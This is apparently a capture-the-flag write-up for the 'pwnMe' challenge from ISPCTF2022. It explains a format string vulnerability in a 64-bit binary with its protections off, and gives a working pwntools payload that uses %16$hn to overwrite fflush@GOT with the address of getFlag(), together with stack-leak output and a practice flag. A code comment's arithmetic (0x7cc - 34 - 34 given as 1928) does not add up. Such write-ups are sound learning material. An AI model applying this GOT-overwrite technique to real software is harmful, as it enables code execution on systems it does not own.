# pwnMe

- This challenges is not available now, so, I create a fake flag for practice purpose.

## OVERVIEW & Idea

- Challenges has only one binary file, so, I do some checksec, decompilation of this file to get more informations.

- This file is 64-bit and all proctecting functions are off.

![img](/ISPCTF2022/pwnMe/assets/checksec.png)

- Its decompilation of main function, as you can see, this program has format string vulnerability `printf(format)`.

![img](/ISPCTF2022/pwnMe/assets/main_func.png)

- Other functions are normal, except this functions, I think that the target of this challenge is jump to this function `getFlag()`.

![img](/ISPCTF2022/pwnMe/assets/getFlag.png)

- Run the program:
```
λ ~/pwn_me/ ./pwnMe
Tell me your name:
AAAA
I don't have any present for you, AAAA
```

- Above are all necessary informations of this binary file for our exploitation. In this challenge, I will take advantage of format string vuln `printf(format)` to overwrite the `fflush@GOT.plt` with address of `getFlag()`, so when the program run the `fflush(0LL)`, it redirects to `getFlag()` and print the flag, it's possible because of all proctecting functions are off.

## DETAILS

- First, I find the address of `getFlag()` and `fflush@GOT.plt`

![img](/ISPCTF2022/pwnMe/assets/getFlag_address.png)

![img](/ISPCTF2022/pwnMe/assets/fflush_got.png)

- The address of 2 functions is different at last 2 bytes, so, I will use `%hn` specifiers to modifide it.

- Then I run some test for this program:

```
λ ~/pwn_me/ ./pwnMe
Tell me your name:
AAAAAAAA.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx
I don't have any present for you, AAAAAAAA.4008a4.0.1.0.7f548dcfc4e0.2074276e6f642049.796e612065766168.746e657365727020.756f7920726f6620.414141414141202c.2e786c6c252e4141.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.a
```

- You can see that, the start of input is not align. So I must put the start of address in index `multiple of 8 + 6 - 1`.

- And I found it's perfect with `45` (46 is size).

![img](/ISPCTF2022/pwnMe/assets/stack.png)

- The index of argument is `16`, I found it by some debug with `%x`. So, `%16$hn` is the specifiers for `%hn` position.
- Last 2 bytes will be modifided by the number of character that printf printed to output. It will take 6 character, so, the padding will be `46 (total) - 6 (%16$hn) - 6 (%xxxxc) = 34 (padding)` character.

- We now have all the things to exploit, let's do it.

## EXPLOIT

- Exploit file
```python
# filename: exp.py
from pwn import *

address_getf = 0x7cc - 34 - 34  # 1928

fflush_got_plt = 0x600c48

payload = '%1928c'+'a'*34 +'%16$hn' + p64(fflush_got_plt)

print(payload)
```

- Command
```
python2 exp.py | ./pwnMe
```

## RESULT

```
λ ~/pwn_me/ python2 exp.py | ./pwnMe
Tell me your name:
I don't have any present for you,










                                                                                           �aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaH
                                                                                                                               `FLAG{28ca988f98e9ca9d7a7c7e77g788a}
```